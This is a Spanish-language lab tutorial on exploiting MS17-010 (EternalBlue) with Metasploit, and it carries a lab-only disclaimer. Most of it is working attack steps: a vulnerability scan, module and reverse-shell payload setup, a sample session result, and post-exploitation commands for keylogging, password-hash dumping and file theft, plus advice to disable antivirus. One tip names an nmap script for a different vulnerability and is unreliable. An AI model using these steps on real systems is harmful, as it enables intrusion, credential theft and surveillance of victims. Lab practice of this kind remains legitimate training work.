# 🛡️ **Guía para Explotar MS17-010 con Metasploit**
_______________________________________
## ⚠️ Aviso Legal / Disclaimer
Este ejercicio se realiza únicamente con fines educativos y de aprendizaje en un entorno controlado y autorizado.
No debe utilizarse en redes, sistemas o equipos fuera del laboratorio sin el consentimiento explícito del propietario.
El uso indebido de estas técnicas en contextos reales puede ser ilegal y tener consecuencias legales graves.
Como estudiantes y profesionales de la ciberseguridad, debemos actuar siempre de forma ética y responsable.
_______________________________________
Esta guía explica paso a paso cómo explotar la vulnerabilidad MS17-010 (EternalBlue) usando Metasploit Framework. Solo debe usarse con fines educativos o en entornos de laboratorio controlado. Explotar sistemas sin permiso es ilegal.
_______________________________________

# 🛡️ **¿Qué es MS17-010 (EternalBlue)?**

- Vulnerabilidad crítica en el protocolo SMBv1 de Windows.
-	Permite ejecución remota de código sin autenticación.
-	Afecta Windows XP, 7, 8, Server 2003, 2008, 2012 (si no está parchado).
-	Fue utilizada por el ransomware WannaCry y NotPetya.
_______________________________________
## 🧰 Requisitos del entorno de pruebas
-	💻 Kali Linux (máquina atacante). https://www.kali.org/get-kali/#kali-platforms
-	🧱  [Máquina vulnerable: Windows 7 SP1 o Windows Server 2008 sin el parche MS17-010.](https://drive.google.com/file/d/11f_wsW59Dh1fGvQCNUPK70lIWzlcg44_/view)
-	🌐 Ambas máquinas deben estar en la misma red local o virtual interna.
________________________________________
## 🧪 Paso a paso para explotar MS17-010 con Metasploit
________________________________________
**🔹 1. Verifica conectividad y vulnerabilidad**
Desde Kali:
<pre> ping [IP_de_la_víctima] </pre>
Opcional (para verificar si es vulnerable):
<pre> nmap -p 445 --script smb-vuln-ms17-010 [IP_víctima] </pre>
Si dice VULNERABLE, puedes continuar.
________________________________________
**🔹 2. Iniciar Metasploit**
<pre> msfconsole </pre>

**🔹 3. Buscar el exploit**
<pre>search eternalblue</pre>
Deberías ver:
<pre> exploit/windows/smb/ms17_010_eternalblue </pre>
________________________________________
**🔹 4. Seleccionar el exploit**
<pre> use exploit/windows/smb/ms17_010_eternalblue </pre>
________________________________________
**🔹 5. Ver las opciones requeridas**
<pre> show options </pre>

Debes configurar:
-	**RHOST:** IP de la víctima
-	**LHOST:** IP del atacante
-	**PAYLOAD:** tipo de shell que quieres usar
________________________________________
**🔹 6. Configurar los parámetros**
 ```bash
set RHOST [IP_de_la_víctima]
set LHOST [IP_de_Kali]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
También puedes usar  ```bash windows/meterpreter/reverse_tcp  ``` si la víctima es de 32 bits.
________________________________________
**🔹 7. Verificar configuración**
<pre> show options </pre>
________________________________________
**🔹 8. Ejecutar el exploit**
<pre> exploit </pre>
________________________________________
## ✅ **Resultado esperado**
```bash
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage ...
[*] Meterpreter session 1 opened
```
¡Ahora tienes acceso remoto a la máquina!
________________________________________
## 🧠 **¿Qué hacer con Meterpreter?**
**Comandos útiles:**
- **sysinfo:**	Información del sistema
- **getuid:**	Usuario actual
- **shell:**	Abre CMD de la víctima
- **screenshot:**	Captura pantalla
- **download archivo:**	Descargar archivos
- **keyscan_start:**	Inicia keylogger
- **hashdump:**	Extraer hashes de contraseñas
________________________________________
## 🔒 Precauciones
-	No usar este exploit en redes reales o con máquinas no autorizadas.
-	EternalBlue afecta SMBv1, un protocolo antiguo y obsoleto.
________________________________________
## ❌ **Consejos adicionales**

- Para verificar si el Windows 7 es vulnerable: ```bash nmap -p 445 --script smb-vuln-ms08-067 [IP_víctima] ```
- Si el Exploit dice "No session created"	Verifica que la víctima sea vulnerable (sin parche KB4012212 o similar)
- LHOST mal configurado	Usa la IP correcta de tu Kali, no 127.0.0.1 ni una IP de otra red
- Antivirus bloquea el payload	Desactívalo (solo en laboratorio)
- Máquina víctima no usa SMBv1	Actívalo o usa una VM XP/7 sin actualizar
________________________________________
## 📚 **Recursos**
- [Exploit-DB: MS17-010](https://www.exploit-db.com/exploits/42315)
- [Rapid7 Metasploit Docs](https://www.rapid7.com/blog/post/2017/05/20/metasploit-the-power-of-the-community-and-eternalblue/)
-	[Hack The Box](https://www.hackthebox.com/machines/blue)
- [TryHackMe](https://tryhackme.com/room/blue)
